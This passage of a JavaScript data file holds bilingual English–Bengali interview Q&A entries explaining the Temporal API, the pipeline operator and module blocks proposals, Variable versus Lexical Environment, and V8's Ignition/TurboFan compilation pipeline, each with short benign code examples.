- **Strict Separation**: Separate APIs for different use cases:
  - \`Temporal.PlainDate\`: Date without timezone/time (e.g. 2026-06-19).
  - \`Temporal.ZonedDateTime\`: Date + Time + Timezone context.
  - \`Temporal.Duration\`: Measures periods of time for arithmetic calculations.

### Real-World Example
Calculating differences between dates. Standard JS requires converting dates to milliseconds, subtracting them, and dividing by \`86400000\` to find days. In Temporal, it is a clean \`date1.until(date2)\` operation.

### Best Practice
Use polyfills for the Temporal API in production code today since it is in stage 3 draft standard, preparing your code for native browser implementations.

### Common Mistakes
Expecting legacy \`Date\` methods to work on Temporal objects. They are completely separate, incompatible types.

### Code Example
\`\`\`javascript
// Note: Requires polyfill in current browsers
// const today = Temporal.Now.plainDateISO();
// console.log(today.toString()); // "2026-06-19"

// Adding durations safely
// const nextWeek = today.add({ days: 7 });
// console.log(nextWeek.toString()); // "2026-06-26"

// Date difference
// const duration = today.until(nextWeek);
// console.log(duration.days); // 7
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
পুরোনো \`Date\` অবজেক্টটি নানাবিধ বাগের জন্য কুখ্যাত (যেমন: মাস ০ থেকে শুরু হওয়া, সরাসরি মিউটেট হওয়া, টাইমজোন কনভার্সনে জটিলতা)। এই সমস্যাগুলো সমাধানে প্রবর্তিত হচ্ছে **\`Temporal\`**:
- **ইমিউটেবিলিটি**: সকল Temporal অবজেক্ট রিড-অনলি। যেকোনো পরিবর্তনের মেথড কল করলে নতুন অবজেক্ট রিটার্ন হয়।
- **স্পষ্ট বিভাজন**: একেক কাজের জন্য আলাদা এপিআই রয়েছে:
  - \`Temporal.PlainDate\`: কেবল তারিখ (যেমন ২০২৬-০৬-১৯)।
  - \`Temporal.ZonedDateTime\`: তারিখ + সময় + টাইমজোন সমৃদ্ধ ডাটা।
  - \`Temporal.Duration\`: গাণিতিক হিসাবের জন্য সময়ের ব্যবধান বা স্থায়িত্ব মাপার মেথড।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
দুইটি তারিখের মধ্যকার ব্যবধান বের করা। পুরোনো পদ্ধতিতে মিলি-সেকেন্ডে রূপান্তর করে, বিয়োগ করে, ভাগ করে বের করতে হতো। Temporal এপিআই-তে এটি কেবল \`date1.until(date2)\` কল করলেই হয়ে যায়।

### উত্তম অনুশীলন (Best Practice)
যেহেতু এপিআই-টি বর্তমানে Stage 3 ড্রাফটে আছে, তাই প্রোডাকশনে ব্যবহারের জন্য এর অফিশিয়াল পলিফিল ব্যবহার করুন যাতে ব্রাউজারের নেটিভ কোডে সহজেই মাইগ্রেট করা যায়।

### সাধারণ ভুলসমূহ (Common Mistakes)
পুরোনো \`Date\` অবজেক্টের মেথডগুলো Temporal অবজেক্টে ব্যবহার করতে চাওয়া। এরা সম্পূর্ণ আলাদা এবং ইনকম্প্যাটিবল টাইপ।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
// নোট: বর্তমানে ব্রাউজারে এটি চালাতে পলিফিল প্রয়োজন
// const today = Temporal.Now.plainDateISO();
// console.log(today.toString()); // "2026-06-19"

// সহজে দিন যোগ করা (রিটার্ন নতুন অবজেক্ট দিবে)
// const nextWeek = today.add({ days: 7 });
// console.log(nextWeek.toString()); // "2026-06-26"

// ব্যবধান মাপা
// const duration = today.until(nextWeek);
// console.log(duration.days); // 7
\`\`\``
  },
  {
    id: 'javascript-98',
    title: 'Explain the Pipeline Operator (|>) and Module Blocks drafts.',
    difficulty: 'advanced',
    category: 'javascript',
    tags: ['JavaScript', 'Proposals', 'Pipeline Operator', 'Syntax'],
    enAnswer: 'The Pipeline Operator (|>) passes the result of an expression as the argument to the next function. Module Blocks allow inline module declaration, useful for workers.',
    bnAnswer: 'Pipeline Operator (|>) একটি এক্সপ্রেশনের ফলাফলকে পরবর্তী ফাংশনের আর্গুমেন্ট হিসেবে পাস করে। Module Blocks ইনলাইন মডিউল ডিক্লেয়ার করতে দেয়।',
    enExplanation: `### Explanation
These are active TC39 ECMAScript proposals:
- **Pipeline Operator (\`|>\`)**: Improves readability when nesting multiple function calls (functional composition). Instead of writing \`step3(step2(step1(val)))\`, you write \`val |> step1 |> step2 |> step3\`.
- **Module Blocks**: Synthesized using \`module { ... }\`. Allows writing modular code blocks inline inside a single JavaScript file, facilitating packaging modules dynamically to send to Web Workers.

### Real-World Example
Text processing engines. A string undergoes lowercasing, then trimming, then symbol removal. Using the pipeline operator makes the transformation steps highly readable as a sequential flow.

### Best Practice
Do not use these draft features in production apps today unless you configure Babel/SWC plugins to transpile them safely, as their syntax specifications can change before final approval.

### Common Mistakes
Assuming these features are already supported natively by browsers. They are active drafts and require transpiler configurations.

### Code Example
\`\`\`javascript
// Note: Syntax represents TC39 proposal draft (Hack style pipeline)
// const double = (x) => x * 2;
// const addFive = (x) => x + 5;

// Traditional nesting:
// const res = addFive(double(10)); // 25

// Pipeline Operator:
// const res = 10 |> double(%) |> addFive(%); // 25 (using '%' placeholder)
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
এগুলো মূলত সক্রিয় TC39 ECMAScript প্রপোজাল ড্রাফট:
- **পাইপলাইন অপারেটর (\`|>\`)**: একাধিক নেস্টেড ফাংশন কলের ক্ষেত্রে রিডিবিলিটি বাড়ায়। \`step3(step2(step1(val)))\` এর পরিবর্তে এটিকে সিকোয়েন্স চেইনে লেখা যায়: \`val |> step1 |> step2 |> step3\`।
- **মডিউল ব্লকস (Module Blocks)**: \`module { ... }\` সিনট্যাক্স দিয়ে ডিক্লেয়ার করা হয়। এটি একটি ফাইলের ভেতরেই ইনলাইন মডিউল ডিফাইন করার সুবিধা দেয়, যা ওয়েব ওয়ার্কার লোড করার বয়লারপ্লেট অনেক কমাবে।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
টেক্সট প্রসেসিং ফ্লো। একটি স্ট্রিংকে প্রথমে লোয়ারকেস করা, তারপর ট্রিম করা ও সবশেষে কাস্টম ক্যারেক্টার দিয়ে ফিল্টার করা। পাইপলাইন অপারেটর ব্যবহার করলে কোডের ফ্লো অনেক চমৎকার দেখায়।

### উত্তম অনুশীলন (Best Practice)
চূড়ান্ত স্ট্যান্ডার্ড অনুমোদন পাওয়ার পূর্বে প্রোডাকশন কোডে এগুলো ব্যবহার করা এড়িয়ে চলুন, অথবা Babel/SWC এর ট্রান্সপাইলার প্লাগইন ব্যবহার করুন।

### সাধারণ ভুলসমূহ (Common Mistakes)
ধরে নেওয়া যে ব্রাউজারে এগুলো এমনিতেই কাজ করবে। এগুলো খসড়া প্রস্তাবনা হওয়ায় রান করাতে বিল্ড টুলের ট্রান্সপাইলেশন আবশ্যক।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
// নোট: এটি কেবল TC39 প্রপোজাল ড্রাফটের সিনট্যাক্স উপস্থাপন করে
// const double = (x) => x * 2;
// const addFive = (x) => x + 5;

// সনাতন নেস্টেড কল:
// const res = addFive(double(10)); // 25

// পাইপলাইন অপারেটর দিয়ে:
// const res = 10 |> double(%) |> addFive(%); // 25 ('%' প্লেসহোল্ডার ব্যবহার করে)
\`\`\``
  },
  {
    id: 'javascript-99',
    title: 'Explain Variable Environment vs Lexical Environment inside Execution Contexts.',
    difficulty: 'advanced',
    category: 'javascript',
    tags: ['JavaScript', 'Execution Context', 'Scope', 'V8 Engine'],
    enAnswer: 'Lexical Environment holds block-scoped variables (let, const) and changes dynamically inside blocks. Variable Environment only holds function-scoped variables (var) and stays fixed for the context.',
    bnAnswer: 'Lexical Environment ব্লক-স্কোপড ভ্যারিয়েবল (let, const) ধারণ করে ও ব্লকের ভেতর বদলে যায়। Variable Environment কেবল ফাংশন-স্কোপড (var) ভ্যারিয়েবল ধারণ করে।',
    enExplanation: `### Explanation
Inside an execution context created by the JS engine:
- **\`LexicalEnvironment\`**:
  - Holds variables declared with \`let\` and \`const\`, and function declarations.
  - Generates a new environment record whenever a block scope \`{}\` is entered, allowing block-level scoping.
- **\`VariableEnvironment\`**:
  - Only holds variables declared with the \`var\` keyword.
  - Stays fixed for the entire duration of the function or global execution context, explaining why \`var\` ignores block scopes.

### Real-World Example
Debugging scoping issues. Understanding these environments explain why a \`var\` loop counter is accessible outside the loop (stored in the stable VariableEnvironment), while a \`let\` counter throws an error (scoped to the temporary block LexicalEnvironment).

### Best Practice
Rely strictly on the LexicalEnvironment by using \`let\` and \`const\` to ensure block isolation and clean scope boundaries.

### Common Mistakes
Thinking \`var\` has block scope. \`var\` is stored in the outer execution context's VariableEnvironment, ignoring the block boundary entirely.

### Code Example
\`\`\`javascript
function example() {
  var varVal = 1;
  let letVal = 2;
  
  if (true) {
    var varInside = 3;  // Stored in VariableEnvironment of 'example'
    let letInside = 4;  // Stored in new LexicalEnvironment of this 'if' block
  }
  
  console.log(varInside); // 3 (Accessible!)
  // console.log(letInside); // ReferenceError: letInside is not defined
}
example();
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
জাভাস্ক্রিপ্ট ইঞ্জিনের তৈরি করা প্রতিটি এক্সিকিউশন কনটেক্সটের ভেতর দুটি উপাদান থাকে:
- **\`LexicalEnvironment\`**:
  - এটি \`let\` ও \`const\` ভ্যারিয়েবল এবং ফাংশন ডিক্লেয়ারেশনগুলো স্টোর করে।
  - কোড কোনো ব্লক স্কোপে \`{}\` প্রবেশ করলেই এটি চাইল্ড ডিক্লেয়ারেশন রেকর্ড তৈরি করে ব্লক স্কোপিং নিশ্চিত করে।
- **\`VariableEnvironment\`**:
  - এটি কেবল \`var\` কি-ওয়ার্ড দিয়ে ডিক্লেয়ার করা ভ্যারিয়েবলগুলো স্টোর করে।
  - এটি পুরো ফাংশনের এক্সিকিউশন জুড়ে অপরিবর্তিত থাকে, যার ফলে \`var\` কখনো ব্লক চেনে না।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
স্কোপ ডিবাগিং। লুপের ভেতরে \`var\` ব্যবহার করলে তা লুপের বাইরে কেন রিড করা যায় (VariableEnvironment এ সেভ হওয়ায়), আর \`let\` ব্যবহার করলে কেন তা লক থাকে (LexicalEnvironment এ লক হওয়ায়)।

### উত্তম অনুশীলন (Best Practice)
স্কোপ আইসোলেশন ও সেফ ভ্যারিয়েবল ম্যানেজমেন্টের জন্য সবসময় \`let\` এবং \`const\` ব্যবহার করে LexicalEnvironment এর ফিচারগুলোকে কাজে লাগান।

### সাধারণ ভুলসমূহ (Common Mistakes)
মনে করা যে \`var\` ব্লকের ভেতর আলাদাভাবে স্কোপড হয়। \`var\` ব্লকের বাউন্ডারি সম্পূর্ণ ইগনোর করে আউটার এক্সিকিউশন লেভেলে নিজেকে ম্যাপ করে।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
function example() {
  var varVal = 1;
  let letVal = 2;
  
  if (true) {
    var varInside = 3;  // 'example' এর VariableEnvironment এ সেভ হবে
    let letInside = 4;  // এই 'if' ব্লকের ক্ষণস্থায়ী LexicalEnvironment এ সেভ হবে
  }
  
  console.log(varInside); // 3 (অ্যাক্সেস করা যাবে!)
  // console.log(letInside); // ReferenceError দিবে
}
example();
\`\`\``
  },
  {
    id: 'javascript-100',
    title: 'Explain the V8 Engine compilation pipeline (Ignition, TurboFan, Deoptimization).',
    difficulty: 'advanced',
    category: 'javascript',
    tags: ['JavaScript', 'V8 Engine', 'Compilation', 'JIT Compiler', 'Performance'],
    enAnswer: 'The V8 engine compiles JS using Just-In-Time (JIT) compilation: Ignition interprets code to bytecode, TurboFan optimizes hot code to machine code, and deoptimization triggers if type assumptions fail.',
    bnAnswer: 'V8 ইঞ্জিন JIT কম্পাইলেশন ব্যবহার করে: Ignition ইন্টারপ্রেটার কোডকে বাইটকোডে রূপান্তর করে, TurboFan হট-কোডকে মেশিন কোডে অপ্টিমাইজ করে এবং টাইপ বদলে গেলে Deoptimization ঘটে।',
    enExplanation: `### Explanation
Google's V8 engine (used in Chrome and Node.js) utilizes JIT (Just-In-Time) compilation:
1. **Parser**: Generates the AST (Abstract Syntax Tree) from source code text.
2. **Ignition (Interpreter)**: Compiles AST into bytecode quickly and runs it. During execution, it collects profiling data (identifying "hot code" executed frequently).
3. **TurboFan (Optimizing Compiler)**: Takes hot code and compiles it into highly optimized machine code based on type assumptions.
4. **Deoptimization**: If a function was optimized assuming it only takes numbers, but suddenly receives a string parameter, V8 de-optimizes the machine code, throwing it back to the Ignition interpreter (causing performance hiccups).

### Real-World Example
V8 optimization. If you write a function \`function add(a, b) { return a + b; }\` and call it millions of times with numbers, TurboFan compiles it to machine code. If you suddenly call \`add("1", "2")\`, V8 discards the machine code and recompiles.

### Best Practice
Write monomorphic code (functions that always receive properties/parameters of the exact same type shapes) to help TurboFan optimize your execution paths permanently.

### Common Mistakes
Changing object shapes dynamically by adding or deleting properties at runtime. This breaks V8's hidden classes (Hidden Classes / Shapes), forcing de-optimizations.

### Code Example
\`\`\`javascript
// Monomorphic code (Optimized by TurboFan easily)
function processUser(user) {
  return user.id + 10;
}

const userA = { id: 1 };
const userB = { id: 2 };
processUser(userA);
processUser(userB); // V8 assumes 'user' shape is stable

// Polymorphic code (Harder to optimize)
const userC = { id: 3, age: 25 }; // Different shape!
processUser(userC); // Triggers shape checks and potential de-optimization
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
গুগলের V8 ইঞ্জিন (যা ক্রোম ও নোডে ব্যবহৃত হয়) JIT (Just-In-Time) কম্পাইলেশন ব্যবহার করে কাজ করে:
1. **পার্সার (Parser)**: সোর্স কোড থেকে AST (Abstract Syntax Tree) তৈরি করে।
2. **Ignition (ইন্টারপ্রেটার)**: AST-কে খুব দ্রুত বাইটকোডে রূপান্তর করে রান করায়। রান করার সময় এটি প্রোফাইলিং ডাটা কালেক্ট করে ট্র্যাক করে কোন কোন কোড বারবার কল হচ্ছে (হট কোড)।
3. **TurboFan (অপ্টিমাইজার কম্পাইলার)**: হট কোডগুলোকে নিয়ে টাইপ অনুমানের ওপর ভিত্তি করে অত্যন্ত দ্রুতগতির ফিজিক্যাল মেশিন কোডে রূপান্তর করে।
4. **Deoptimization (ডি-অপ্টিমাইজেশন)**: টাইপ অনুমানে ভুল হলে (যেমন: নম্বরের জন্য তৈরি অপ্টিমাইজড মেথডে স্ট্রিং আর্গুমেন্ট আসলে) JIT মেশিন কোডটি বাতিল করে পুনরায় সাধারণ ইন্টারপ্রেটার মোডে ব্যাক করে।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
V8 অপ্টিমাইজেশন। আপনি যদি একটি ফাংশন \`add(a, b)\` লিখে তাকে লাখ বার কেবল নাম্বার ইনপুট দিয়ে কল করেন, তবে TurboFan একে মেশিন কোডে রূপান্তর করে। কিন্তু হঠাৎ যদি আপনি \`add("1", "2")\` দিয়ে কল করেন, V8 ওই অপ্টিমাইজড কোডটি ফেলে দিয়ে আবার নতুন করে রি-কম্পাইল করে।

### উত্তম অনুশীলন (Best Practice)
ফাংশনগুলোতে সবসময় একই টাইপ বা শেপের আর্গুমেন্ট পাস করুন (একে Monomorphic কোড বলে), যা TurboFan-কে স্থায়ীভাবে কোড অপ্টিমাইজ করতে সাহায্য করে।

### সাধারণ ভুলসমূহ (Common Mistakes)
রানটাইমে অবজেক্টের কী (keys) ডাইনামিকালি ডিলিট বা অ্যাড করা। এটি V8-এর ইন্টারনাল অবজেক্ট শেপ বা হিডেন ক্লাস (Hidden Classes) ব্রেক করে অপ্টিমাইজেশন নষ্ট করে।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
// Monomorphic কোড (TurboFan সহজেই অপ্টিমাইজ করতে পারে)
function processUser(user) {
  return user.id + 10;
}

const userA = { id: 1 };
const userB = { id: 2 };
processUser(userA);
processUser(userB); // V8 ধরে নেয় ইউজারের শেপ অপরিবর্তিত থাকবে

// Polymorphic কোড (অপ্টিমাইজ করা কঠিন)
const userC = { id: 3, age: 25 }; // ভিন্ন কাস্টম শেপ!
processUser(userC); // এটি হিডেন ক্লাস রি-ম্যাপ করতে বাধ্য করবে
\`\`\``
  }
];
